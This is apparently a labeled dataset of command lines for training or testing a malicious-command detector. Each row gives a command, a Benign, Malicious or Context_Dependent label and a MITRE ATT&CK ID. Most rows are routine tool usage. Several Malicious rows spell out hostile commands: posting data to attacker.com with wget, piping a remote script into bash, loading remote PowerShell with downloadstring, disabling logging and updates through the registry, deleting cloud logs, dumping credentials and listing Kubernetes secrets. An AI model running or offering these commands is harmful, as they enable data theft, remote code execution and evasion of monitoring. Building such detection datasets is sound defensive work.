command,label,original_label,mitre_id
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force",Malicious,Malicious,T1484
patch < patch.diff,Benign,Benign,Benign
InvocationMethod = '$invocation_method',Malicious,Malicious,T1218
mount -t linprocfs none /proc,Context_Dependent,Benign,Benign
git maintenance run --task commit-graph|gc|incremental-repack|loose-objects|pack-refs|prefetch,Benign,Benign,Benign
public class Test {,Malicious,Malicious,T1036
ppmcie > path/to/output.ppm,Benign,Benign,Benign
chmod g+w $(ls -1a | grep -v '^..$'),Benign,Benign,Benign
sudo trace-cmd clear,Benign,Benign,Benign
dvc gc [-a|--all-commits] [-c|--cloud] [-r|--remote] remote_name,Benign,Benign,Benign
ppmtoarbtxt path/to/template -hd path/to/tail_template path/to/image.ppm > path/to/output_file.txt,Benign,Benign,Benign
"wmic /node:<ip> process call create ""cmd /c copy c:\Users\<username>\<path>\backup.pst c:\windows\temp\backup.pst"" copy ""i:\<path>\<username>\My Documents\<filename>.pst""",Malicious,Malicious,T1114
pipewire-pulse [-c|--config] path/to/pipewire-pulse.conf,Benign,Benign,Benign
raku -M module_name path/to/script.raku,Benign,Benign,Benign
watchexec -- hledger [-f|--file] path/to/bank.csv print,Benign,Benign,Benign
checkov --compact --file path/to/file,Benign,Benign,Benign
vagrant init [-f|--force],Benign,Benign,Benign
command | cut [-c|--characters] 5,Benign,Benign,Benign
find . -type f -print0 | xargs -0 chmod go+r,Benign,Benign,Benign
"[[ ! -z `find 'YOUR_DIR/' -name 'something'` ]] && echo ""found"" || echo ""not found""",Benign,Benign,Benign
pidstat -d,Benign,Benign,Benign
find . -name \*.c -exec grep wait_event_interruptible {} /dev/null \;,Benign,Benign,Benign
fdp -?,Benign,Benign,Benign
dmd -boundscheck=on|safeonly|off,Benign,Benign,Benign
kwallet-query kdewallet [-l|--list-entries] [-f|--folder] folder_name,Benign,Benign,Benign
ctest [-N|--show-only],Benign,Benign,Benign
"usermod --expiredate ""1"" art",Malicious,Malicious,T1078
takeown,Malicious,Malicious,T1222
oauth2c issuer_url --client-id client_id --client-secret client_secret,Benign,Benign,Benign
apkeep [-a|--app] com.example.application [-d|--download-source] apk-pure|google-play|f-droid|huawei-app-gallery path/to/directory,Benign,Benign,Benign
find . -iname 'MyFile*',Benign,Benign,Benign
pip install [-f|--find-links] url|path/to/directory package,Benign,Benign,Benign
which openssl,Context_Dependent,Synthetic,Synthetic
emond -c path/to/config_file,Benign,Benign,Benign
whatis command,Benign,Benign,Benign
pamtowinicon [-t|-truetransparent] path/to/input_file.pam > path/to/output.ico,Benign,Benign,Benign
"Compress-Archive -Path ""$input_file"" -DestinationPath $output_file -Force",Malicious,Malicious,T1074
cat /var/log/secure,Context_Dependent,Synthetic,Synthetic
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate"" /t REG_DWORD /d 1 /f",Malicious,Malicious,T1112
comm -1 -2 file1.sorted file2.sorted,Benign,Benign,Benign
Exec,Malicious,Malicious,T1547
nmap -sV 192.168.1.10,Context_Dependent,Synthetic,Synthetic
avahi-browse [-a|--all] --domain=domain,Benign,Benign,Benign
tail -20 /etc/pam.d/common-auth,Context_Dependent,Synthetic,Synthetic
/var/log/wtmp,Malicious,Malicious,T1070
updog --password password,Benign,Benign,Benign
$newModule.CodeModule.AddFromString($vbaCode),Malicious,Malicious,T1137
certutil -encode path\to\input_file path\to\output_file,Benign,Benign,Benign
read -r ans,Benign,Benign,Benign
"espeak-ng -s speed -p pitch ""text""",Benign,Benign,Benign
vagrant halt [-f|--force] id_or_name,Benign,Benign,Benign
"'@ -OutputAssembly ""$executable_filepath""",Malicious,Malicious,T1036
tasklist.exe | findstr /i cylance,Context_Dependent,Malicious,T1518
einfo -db protein -links,Benign,Benign,Benign
dig target.com ANY,Context_Dependent,Synthetic,Synthetic
pluma,Benign,Benign,Benign
sfc,Benign,Benign,Benign
ls -d !(*@(.c|.h)),Benign,Benign,Benign
cat /proc/net/udp,Context_Dependent,Synthetic,Synthetic
path/to/server_linux -password password,Benign,Benign,Benign
omf list,Benign,Benign,Benign
"find . -name *.xml | xargs grep -P ""[\x80-\xFF]""",Benign,Benign,Benign
compress -v path/to/file,Benign,Benign,Benign
CreateRemoteThread,Malicious,Malicious,T1055
get path/to/remote_file,Benign,Benign,Benign
script -q -c '# DATA' /path/to/output-file,Malicious,Malicious,T1222
stdbuf -o 0 ./a | tee output.txt,Benign,Benign,Benign
tldr Where-Object,Benign,Benign,Benign
findmnt -t ext4,Context_Dependent,Synthetic,Synthetic
jigsaw serve build_production,Benign,Benign,Benign
"osascript -e 'say ""Hello""' -e 'say ""world""'",Benign,Benign,Benign
kubectl top [po|pods],Context_Dependent,Benign,Benign
<RightShift F12>,Benign,Benign,Benign
mandb --test,Benign,Benign,Benign
"find / -xdev -name ""*.rpm""",Context_Dependent,Benign,Benign
calligrawords path/to/document,Benign,Benign,Benign
git grep ^ | wc -l,Benign,Benign,Benign
wireplumber,Benign,Benign,Benign
kubectl apply set-last-applied [-f|--filename] path/to/file,Benign,Benign,Benign
gst-launch-1.0 pulsesrc device=@DEFAULT_MONITOR@ ! opusenc ! oggmux ! filesink location=path/to/file.ogg,Benign,Benign,Benign
find / -type f|awk -F'/' '{print $NF}'| awk 'length($0) < 25',Context_Dependent,Benign,Benign
fmt -pNON_EXISTING_PREFIX /path/to/input-file,Context_Dependent,Malicious,T1005
"find . -name *.php -or -path ""./vendor"" -prune -or -path ""./app/cache"" -prune",Benign,Benign,Benign
find source/directory -ctime -2 | cpio -pvdm /my/dest/directory,Benign,Benign,Benign
mac2unix [-n|--newfile] path/to/file path/to/new_file,Benign,Benign,Benign
netsh,Malicious,Malicious,T1562
pw-mididump [-r|--remote] remote_instance_name,Benign,Benign,Benign
systemd-tmpfiles --create,Benign,Benign,Benign
xdelta delta -0..9 path/to/old_file path/to/new_file path/to/patch_file,Benign,Benign,Benign
ico -i -lw 10 -threads 5,Benign,Benign,Benign
salloc,Benign,Benign,Benign
TCP,Malicious,Malicious,T1205
crontab -l > /tmp/notevil,Malicious,Malicious,T1053
find . -iname .svn -exec bash -c 'rm -rf {}' \;,Benign,Benign,Benign
whoami /logonid,Context_Dependent,Benign,Benign
nf-core list,Benign,Benign,Benign
"electron-packager ""path/to/app"" ""app_name"" --platform=""linux"" --arch=""x64""",Benign,Benign,Benign
"find / -name ""*.dbf""",Context_Dependent,Benign,Benign
gradle :subproject:clean,Benign,Benign,Benign
nextflow run workflow -work-dir path/to/directory -with-report report.html,Benign,Benign,Benign
"find /path -type f -name ""10*jpg"" | sed 's/.*/mv &/' | sed 's/mv \(.*\/\)\(.[^/]*\)/& \120\2/' | sh",Benign,Benign,Benign
dart pub get,Benign,Benign,Benign
cython [-o|--output-file] path/to/output_file path/to/file,Benign,Benign,Benign
sudo hwclock,Benign,Benign,Benign
stack exec program -- argument,Benign,Benign,Benign
ifconfig eth0:fakenfs 192.0.2.55 netmask 255.255.255.255,Context_Dependent,Benign,Benign
dnsx [-d|-domain] FUZZ.example.com [-w|-wordlist] path/to/wordlist.txt [-re|-resp],Benign,Benign,Benign
Function Search-Files {,Context_Dependent,Malicious,T1005
systemd-cryptenroll --unlock-fido2-device path/to/fido2_hidraw_unlock_device --fido2-device path/to/fido2_hidraw_enroll_device path/to/luks2_block_device,Benign,Benign,Benign
twopi -T png -O path/to/input.gv,Benign,Benign,Benign
sudo fbi path/to/file1 path/to/file2 ...,Benign,Benign,Benign
wcurl [-o|--output] path/to/file https://example.com/index.html,Benign,Benign,Benign
pdfseparate -f 3 path/to/source_filename.pdf path/to/destination_filename-%d.pdf,Benign,Benign,Benign
dirs,Benign,Benign,Benign
bluetoothd [-d|--debug],Benign,Benign,Benign
crontab -r,Benign,Benign,Benign
"httpx [-u|-target] host1,host2,... [-mc|-match-code] 200,301,304",Benign,Benign,Benign
tcpdump -i wlan0,Context_Dependent,Synthetic,Synthetic
npm whoami,Benign,Benign,Benign
wget --post-data=DATA http://attacker.com,Malicious,Malicious,T1105
cli53 [rc|rrcreate] --replace 'www 300 A 150.130.110.2',Benign,Benign,Benign
pw-metadata [-d|--delete],Benign,Benign,Benign
"local pingResults=$(LANG=C ping -q -c10 ""$gateway"")",Benign,Benign,Benign
docker service inspect service_name_or_ID1 service_name_or_ID2,Benign,Benign,Benign
sudo chown el my_test_expect.exp,Benign,Benign,Benign
SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List,Malicious,Malicious,T1112
MOUNT A A:\ -t floppy,Context_Dependent,Benign,Benign
kde-inhibit --screenSaver command command_arguments,Benign,Benign,Benign
prqlc watch path/to/directory,Benign,Benign,Benign
railway run cmd,Benign,Benign,Benign
nmcli [n|networking] [c|connectivity] [c|check],Benign,Benign,Benign
ltrace -e malloc+free-@libc.so* path/to/program,Context_Dependent,Benign,Benign
"pacman -T ""bash>5""",Benign,Benign,Benign
public const int SE_PRIVILEGE_ENABLED = 0x00000002;,Malicious,Malicious,T1562
mvn help:evaluate -Dexpression=project.version | tail -8 | head -1,Benign,Benign,Benign
abrt-action-analyze-backtrace -d path/to/directory,Benign,Benign,Benign
qdbus org.kde.Solid.PowerManagement /org/kde/Solid/PowerManagement/Actions/BrightnessControl org.kde.Solid.PowerManagement.Actions.BrightnessControl.setBrightness 5000,Benign,Benign,Benign
sudo strace [-p|--attach] pid,Benign,Benign,Benign
biber path/to/file.bcf [-D|--debug],Benign,Benign,Benign
eselect repository add name rsync|git|mercurial|svn|... sync_uri,Benign,Benign,Benign
curlie post httpbin.org/post name=john age:=25,Benign,Benign,Benign
tor --relay,Benign,Benign,Benign
"Stop-Service -DisplayName ""name""",Benign,Benign,Benign
rdp_check.py domain/username@target,Benign,Benign,Benign
gamescope [-h|--nested-height] 720 [-H|--output-height] 1440 [-S|--scaler] integer -- command,Benign,Benign,Benign
systemctl service-log-target service_name syslog,Benign,Benign,Benign
ifconfig eth0,Context_Dependent,Synthetic,Synthetic
twm,Benign,Benign,Benign
jj interdiff [-f|--from] revset --color-words,Benign,Benign,Benign
jupyter notebook path/to/file.ipynb,Benign,Benign,Benign
/.local/share/keyrings,Malicious,Malicious,T1555
cat ~/.bash_history | grep -i ssh,Context_Dependent,Synthetic,Synthetic
lipo path/to/binary_file.x86_64 path/to/binary_file.arm64e -create -output path/to/binary_file,Benign,Benign,Benign
"Get-Process notepad | Tee-Object -Variable proc | Select-Object processname,handles",Benign,Benign,Benign
"rsync -rcn --out-format=""%n"" old/ new/",Benign,Benign,Benign
gleam check,Benign,Benign,Benign
cypher-shell --help,Benign,Benign,Benign
"find . -name ""file?"" -exec rm -vf {} \;",Benign,Benign,Benign
GetProcessHeap,Malicious,Malicious,T1106
pio device monitor [-b|--baud] 57600,Benign,Benign,Benign
llvm-as path/to/llvm_code.ll | FileCheck path/to/check_file,Benign,Benign,Benign
vercel [-e|--env] ENV=var,Benign,Benign,Benign
cargo binstall package@version,Benign,Benign,Benign
find / -perm -644,Context_Dependent,Benign,Benign
aws logs delete-log-stream --log-group-name $cloudwatch_log_group_name --log-stream-name $cloudwatch_log_stream_name --region $region,Malicious,Malicious,T1562
systemd-sysext list,Benign,Benign,Benign
fmt [-u|--uniform-spacing] path/to/file,Benign,Benign,Benign
swipl path/to/file.pl,Benign,Benign,Benign
freeze path/to/file [-o|--output] path/to/output_image.png,Benign,Benign,Benign
pkcs11-tool [-O|--list-objects] [-p|--pin] auth_pin --slot slot_id,Benign,Benign,Benign
aws ecr batch-delete-image --repository-name repository --image-ids imageTag=latest,Benign,Benign,Benign
npm audit fix [-f|--force],Benign,Benign,Benign
sudo mkswap [-c|--check] path/to/file,Benign,Benign,Benign
"ugrep [-t |--file-type=]cpp ""search_pattern""",Benign,Benign,Benign
"nettacker --ping-before-scan [-m|--modules] port_scan,subdomain_scan,waf_scan,... [-g|--ports] 80,443 [-i|--targets] owasp.org",Benign,Benign,Benign
"ln -sf ""$(readlink -f ""$1"")"" ""$*""",Benign,Benign,Benign
mosquitto_pub < data.txt [-t|--topic] sensors/temperature [-s|--stdin-file],Benign,Benign,Benign
explorer,Benign,Benign,Benign
vswhere -products * -latest -prerelease -find **\VC\Auxiliary\Build\vcvarsall.bat,Benign,Benign,Benign
minipro [-h|--help],Benign,Benign,Benign
i2cset i2cbus device_address register_address value,Benign,Benign,Benign
exiftool -description -W /path/to/output-file --filename /path/to/input-file,Malicious,Malicious,T1222
rabbitmq-queues quorum_status queue,Benign,Benign,Benign
tldr apx stacks,Benign,Benign,Benign
code,Benign,Benign,Benign
jj [desc|describe],Benign,Benign,Benign
irssi [-n|--nick] nickname [-c|--connect] irc.example.com,Benign,Benign,Benign
docker [load|image load] [-i|--input] path/to/image_file.tar,Benign,Benign,Benign
"Set-Service -Name service_name -Description ""description""",Benign,Benign,Benign
yes | command,Benign,Benign,Benign
"find PDFs/ -name '*.pdf' -exec sh -c 'pdftotext ""{}"" - | grep -l -Z -i --label=""{}"" ""perry sound"" | xargs -0 -I{} grep -i -l --label=""{}"" ""October 26, 2004"" ""{}""' \;",Benign,Benign,Benign
flexget -c path/to/config.yml execute --task task_name,Benign,Benign,Benign
gzip -dc path/to/test/file.gz | grep -P --regexp='my regex' | split -dl1000000 - file,Benign,Benign,Benign
aws rds modify-db-instance --db-instance-identifier instance_identifier parameters --apply-immediately,Benign,Benign,Benign
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'),Context_Dependent,Malicious,T1082
"git guilt 'git log --until ""3 weeks ago"" --format ""%H"" [-n|--max-count] 1'",Benign,Benign,Benign
"nettop -p ""process_id|process_name""",Benign,Benign,Benign
"lebab --transform transformation1,transformation2,...",Benign,Benign,Benign
fdupes path/to/directory,Benign,Benign,Benign
find . type -f -amin -2,Benign,Benign,Benign
find -type f -regex '.*\(\(error\|access\)\(_log\)?\|mod_jk\.log\)\.[0-9]+',Benign,Benign,Benign
find -x / -user george -print0 | xargs -0 chown eva,Benign,Benign,Benign
shift n,Benign,Benign,Benign
mh_lint --octave path/to/file.m,Benign,Benign,Benign
tune.exfat [-I|--set-serial] new_serial /dev/sdXY,Benign,Benign,Benign
systemd-id128 boot-id,Benign,Benign,Benign
stordiag.exe,Malicious,Malicious,T1218
comm -23 <(command_which_generate_N|sort) <(command_which_generate_M|sort),Benign,Benign,Benign
"xsetwacom set ""device_name"" Mode ""Relative|Absolute""",Benign,Benign,Benign
typeinc,Benign,Benign,Benign
<Super v>,Benign,Benign,Benign
"krunvm create docker.io/fedora --cpus number_of_vcpus --mem memory_in_megabytes --name ""name""",Benign,Benign,Benign
expac [-S|--sync] '%D' package,Benign,Benign,Benign
curl -k $ip_lookup_url,Context_Dependent,Malicious,T1614
find . -name '*bak' -exec rm -i {} \;,Benign,Benign,Benign
"whatwaf --tor [-p|--payloads] 'payload1,payload2,...' [-u|--url] https://example.com",Benign,Benign,Benign
sensible-editor -O3 path/to/file1 path/to/file2 path/to/file3,Benign,Benign,Benign
sudo fsck /dev/sdXN,Benign,Benign,Benign
mt -f /dev/nstX status,Benign,Benign,Benign
Actual: $ActualOutput,Malicious,Malicious,T1218
wmic shadowcopy call create Volume=$drive_letter,Malicious,Malicious,T1003
xetex -halt-on-error source.tex,Benign,Benign,Benign
prlimit,Benign,Benign,Benign
exiqgrep -i -f '<email@example.com>' | xargs exim -Mrm,Benign,Benign,Benign
killall 'Google Chrome',Malicious,Malicious,T1539
dnf versionlock,Benign,Benign,Benign
find /path/to/directory/* -maxdepth 0 -type d -exec basename {} \;,Benign,Benign,Benign
curl -s icanhazip.com,Context_Dependent,Synthetic,Synthetic
miniserve path/to/file,Benign,Benign,Benign
"security set-identity-preference -s URL|hostname|service -c ""common_name"" path/to/file.keychain",Benign,Benign,Benign
rtmpdump [-r|--rtmp] rtmp://example.com/path/to/video [-o|--flv] file.ext,Benign,Benign,Benign
netstat -ano,Context_Dependent,Malicious,T1049
find /path/to/dest -type d \( ! -name tmp \) -print,Benign,Benign,Benign
mist list installer,Benign,Benign,Benign
pulumi env rm environment_name,Benign,Benign,Benign
"echo ""$a"" | awk '{print tolower($0)}'",Benign,Benign,Benign
pycodestyle --show-source file.py,Benign,Benign,Benign
diff --brief --recursive dir1/ dir2/,Benign,Benign,Benign
set,Context_Dependent,Synthetic,Synthetic
find /DIR -type f -print0 | tr -dc '\0' | wc -c,Benign,Benign,Benign
DelegateExecute,Malicious,Malicious,T1546
picom [-b|--daemon],Benign,Benign,Benign
pacfile path/to/file_or_directory,Benign,Benign,Benign
cliphist list | fzf | cliphist decode | wl-copy,Benign,Benign,Benign
systemctl is-system-running --wait,Benign,Benign,Benign
reflector [-h|--help],Benign,Benign,Benign
kubectl get secrets --all-namespaces,Malicious,Malicious,T1552
eog --single-window path/to/image.jpg,Benign,Benign,Benign
docker buildx version,Benign,Benign,Benign
"dunstify ""Title"" ""Message""",Benign,Benign,Benign
pcapfix path/to/file.pcapng,Benign,Benign,Benign
gdalbuildvrt -input_file_list path/to/list.txt path/to/output.vrt,Benign,Benign,Benign
lit path/to/test_file.test,Benign,Benign,Benign
genie [-c|--command] command,Benign,Benign,Benign
inkscape path/to/file.svg,Benign,Benign,Benign
docker volume subcommand --help,Benign,Benign,Benign
picotool load path/to/binary,Benign,Benign,Benign
picom-trans [-c|--current] [-o|--opacity] percentage,Benign,Benign,Benign
"compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force",Malicious,Malicious,T1555
pyrit list_cores,Benign,Benign,Benign
csc /resource:path/to/resource_file path/to/input_file.cs,Benign,Benign,Benign
/vmfs/volumes/,Malicious,Malicious,T1486
ghci -Wwarning_level,Benign,Benign,Benign
command -v strings,Context_Dependent,Synthetic,Synthetic
pint --test,Benign,Benign,Benign
aiac get mongo query that aggregates all documents by created date,Benign,Benign,Benign
"find . -type f -exec grep -l ""word"" {} +",Benign,Benign,Benign
forfiles,Benign,Benign,Benign
cfv -Tvnu -f path/to/file,Benign,Benign,Benign
"mssqlclient.py username:password@target -query ""SELECT user_name();""",Benign,Benign,Benign
tart run vm-name,Benign,Benign,Benign
sed -i '$ a #art_test_1562_006_1' /etc/audisp/$audisp_config_file_name,Malicious,Malicious,T1562
find . -type f -perm 777 -exec chmod 755 {} \;,Benign,Benign,Benign
elasticsearch-keystore create,Benign,Benign,Benign
autoflake --remove-unused-variables --in-place --recursive path/to/directory,Benign,Benign,Benign
docsify serve [-p|--port] 80 path/to/directory,Benign,Benign,Benign
pg_createsubscriber [-T|--enable-two-phase] [-d|--database] dbname [-D|--pgdata] path/to/data [-P|--publisher-server] connstr,Benign,Benign,Benign
qgis_process plugins,Benign,Benign,Benign
valgrind --tool=massif --stacks=yes program,Benign,Benign,Benign
testparm,Benign,Benign,Benign
libcurl.dll,Malicious,Malicious,T1574
pct [ex|exec] 100 bash,Benign,Benign,Benign
sudo uinput -d /dev/input/eventX /dev/input/eventY ...,Benign,Benign,Benign
pkginfo [-i|--installed],Benign,Benign,Benign
npm prune package_name,Benign,Benign,Benign
head -16482 < file.in | tail -259 > file.out,Benign,Benign,Benign
sublist3r --help,Benign,Benign,Benign
find . -iname .svn -exec rm -rf {} \;,Benign,Benign,Benign
dropbearkey -y -f path/to/key_file,Benign,Benign,Benign
ssh -f user@gateway -p 24222 -L 3307:1.2.3.4:3306 -N,Context_Dependent,Benign,Benign
awk -F'\t' 'NR==FNR{a[$5];next} $5 in a' <(zcat file2.txt) <(zcat file1.txt),Benign,Benign,Benign
lambo edit-after,Benign,Benign,Benign
uv venv path/to/venv,Benign,Benign,Benign
robocopy path\to\source_directory path\to\destination_directory *.jpg *.bmp,Benign,Benign,Benign
"find . -name "".txt"" | grep a",Benign,Benign,Benign
"find /somefolder -type f '(' ""${ARGS[@]}"" ')'",Benign,Benign,Benign
transcrypt [-c|--cipher] cipher,Benign,Benign,Benign
sudo euse [-D|--disable] use_flag,Benign,Benign,Benign
"find temp/medium/* -maxdepth 2 -iname ""*.jpg"" -print0 | xargs -0 mogrify -resize 428x270""^"" -quality 80 -compress JPEG -monitor -strip",Benign,Benign,Benign
spectacle [-i|--new-instance],Benign,Benign,Benign
Resolve-Path ~,Benign,Benign,Benign
hledger [bs|balancesheet] [-M|--monthly] [-V|--market],Benign,Benign,Benign
Set-Location Cert:\LocalMachine\My,Malicious,Malicious,T1552
resume init,Benign,Benign,Benign
clamscan [-i|--infected],Benign,Benign,Benign
"octave-cli --eval 'system(""/bin/sh"")'",Malicious,Malicious,T1059
zapier history,Benign,Benign,Benign
az devops configure [-d|--defaults] project=project_name organization=organization_url,Benign,Benign,Benign
"echo ""$at_command"" | at $time_spec",Malicious,Malicious,T1053
"[Reflection.Assembly]::LoadFile(\""%s\"")\n$i=\""\""\n$r=[%s]::%s(\""%s\"",[ref] $i)\necho $r,$i\n",Malicious,Malicious,T1059
Invoke-Item -Path path\to\directory\* -Include *keyword*,Benign,Benign,Benign
"nx run-many --target target --projects project1,project2",Benign,Benign,Benign
alias pwd='/bin/pwd | pbcopy',Benign,Benign,Benign
kill %job_id,Benign,Benign,Benign
systemctl hibernate --no-wall,Benign,Benign,Benign
most path/to/file +/string,Benign,Benign,Benign
cpulimit [-p|--pid] 1234 [-l|--limit] 25%,Benign,Benign,Benign
html5validator path/to/file,Benign,Benign,Benign
lxc network list,Benign,Benign,Benign
find / -perm /u=s,Context_Dependent,Benign,Benign
cointop holdings --human,Benign,Benign,Benign
"git whatchanged --since ""2 hours ago""",Benign,Benign,Benign
bvnc --shell,Benign,Benign,Benign
echo $(($(date +%s) / 60 / 60 / 24)),Benign,Benign,Benign
minidlna -d,Benign,Benign,Benign
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash,Malicious,Malicious,T1059
vgrep search_pattern,Benign,Benign,Benign
VBoxManage startvm vm_name|uuid [-E|--putenv] name=value,Benign,Benign,Benign
nikto -h https://10.0.0.10,Context_Dependent,Synthetic,Synthetic
msserver.exe,Malicious,Malicious,T1570
valkey-cli -u uri,Benign,Benign,Benign
"find -maxdepth 1 -iname ""*.txt""",Benign,Benign,Benign
sudo hdparm -B 1 /dev/device,Benign,Benign,Benign
ss [-pt|--processes --tcp] dst :ssh,Context_Dependent,Benign,Benign
3d-ascii-viewer --color path/to/model.obj,Benign,Benign,Benign
ldapsearch [-D|--bindDN] 'admin_DN' [-w|--bindPassword] 'password' [-h|--hostname] ldap_host '(|(memberOf=group1)(memberOf=group1)(memberOf=group3))' displayName,Benign,Benign,Benign
check-support-status --no-heading,Benign,Benign,Benign
sudo grub-install path/to/device,Benign,Benign,Benign
jpegtran -transverse path/to/image.jpg > path/to/output.jpg,Benign,Benign,Benign
dvc destroy,Benign,Benign,Benign
sqldumper.exe 540 0 0x01100:40,Malicious,Malicious,T1003
vidir,Benign,Benign,Benign
npm dist-tag rm package_name tag,Benign,Benign,Benign
twurl authorize [-c|--consumer-key] twitter_api_key [-s|--consumer-secret] twitter_api_secret,Benign,Benign,Benign
busybox ash,Malicious,Malicious,T1548
cat files.txt | xargs scp user@remote:,Benign,Benign,Benign
lsof -i :25,Context_Dependent,Synthetic,Synthetic
"Set-Volume -DriveLetter ""D"" -NewFileSystemLabel ""DataVolume""",Benign,Benign,Benign
find ./ -type f -name '*.c*' -print0 | xargs -0 rm -rf &>> log_del.txt,Benign,Benign,Benign
btop [-u|--update] 500,Benign,Benign,Benign
osage -T format -O path/to/input.gv,Benign,Benign,Benign
aws sns create-topic --name name,Benign,Benign,Benign
aws cur put-report-definition --report-definition file://path/to/report_definition.json,Benign,Benign,Benign
find / -perm -2000 -type f 2>/dev/null,Context_Dependent,Synthetic,Synthetic
home-manager rollback,Benign,Benign,Benign
sc start VBoxDRV,Malicious,Malicious,T1564
symfony security:check,Benign,Benign,Benign
astyle [-s|--indent=spaces=]number_of_spaces path/to/file,Benign,Benign,Benign
cacls.exe,Malicious,Malicious,T1222
osmium tags-filter path/to/input.pbf wr/building [-o|--output] path/to/output.pbf,Benign,Benign,Benign
lsns [-t|--type] mnt|net|ipc|user|pid|uts|cgroup|time,Benign,Benign,Benign
gcrane gc [-h|--help],Benign,Benign,Benign
sudo runuser user [-l|--login],Benign,Benign,Benign
opusenc path/to/input.wav --downmix-mono --bitrate 6 path/to/out.opus,Benign,Benign,Benign
phar info -f path/to/phar_file,Benign,Benign,Benign
cargo [b|build] [-r|--release],Benign,Benign,Benign
GetProcessesByName,Context_Dependent,Malicious,T1057
reg query key_name,Benign,Benign,Benign
mh_metric --octave path/to/file1.m path/to/file2.m ...,Benign,Benign,Benign
solcjs --bin --include-path path/to/directory path/to/file.sol,Benign,Benign,Benign
"for f in `find -name \*.jsp` ; do echo ""==> $f"" >> out.txt ; grep ""TODO"" $f >> out.txt ; done",Benign,Benign,Benign
cat `find [whatever]`,Benign,Benign,Benign
npm help-search keyword1 keyword2 ...,Benign,Benign,Benign
"find . -name ""*.gz"" -execdir gunzip '{}' \;",Benign,Benign,Benign
gcloud container clusters describe cluster_name,Benign,Benign,Benign
showmount [-a|--all] hostname,Benign,Benign,Benign
GetHostByName,Malicious,Malicious,T1106
git sed -c 'find_text' 'replace_text',Benign,Benign,Benign
tomb lock encrypted_directory.tomb -k encrypted_directory.tomb.key,Benign,Benign,Benign
reg add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f,Malicious,Malicious,T1112
ipsumdump --src --dst path/to/file.pcap,Benign,Benign,Benign
logsave logfile -,Benign,Benign,Benign
KerberosRequestorSecurityToken.GetRequest,Malicious,Malicious,T1558
ri,Benign,Benign,Benign
"pop < path/to/message.md --from me@example.com --to you@example.com --subject ""On the Subject of Ducks..."" --attach path/to/attachment",Benign,Benign,Benign
find / -name \*.dbf -print0 2>/dev/null | xargs -0 -n1 dirname | sort | uniq,Context_Dependent,Benign,Benign
"ls path/to/videos | mods [-f|--format] ""organize these by decade and summarize""",Benign,Benign,Benign
"REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""",Malicious,Malicious,T1112
GetLastError,Malicious,Malicious,T1106
mkinitcpio [-L|--listhooks],Benign,Benign,Benign
"cmd /c ""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `""$File_to_Encrypt_Location`""""",Malicious,Malicious,T1486
pod init,Benign,Benign,Benign
md5sum *.java | awk '{print $1}' | sort | uniq -d,Benign,Benign,Benign
code2prompt path/to/project [-F|--output-format] json,Benign,Benign,Benign
"{cmd /c copy ""$binary_file"" ""\\$machine\$remote_drive_letter$$exe_remote_folder""",Malicious,Malicious,T1105
sfdk device exec device-name-or-idx command,Benign,Benign,Benign
systemctl service-log-level service_name,Benign,Benign,Benign
find /var/log/ -mmin +60,Benign,Benign,Benign
script [-h|--help],Benign,Benign,Benign
mount \\computer_name\share_name *,Context_Dependent,Benign,Benign
pw-profiler [-h|--help],Benign,Benign,Benign
($Users = Get-AzureADUser -All $true) > $null,Malicious,Malicious,T1110
lprm -h server:port job_id,Benign,Benign,Benign
trace class-pattern method-pattern '#cost > 10',Benign,Benign,Benign
uuidparse [-r|--raw] uuid1 uuid2 ...,Benign,Benign,Benign
sudo minicom [-D|--device] /dev/ttyXYZ [-b|--baudrate] 115200,Benign,Benign,Benign
wal -R,Benign,Benign,Benign
cat /etc/hostname,Context_Dependent,Synthetic,Synthetic
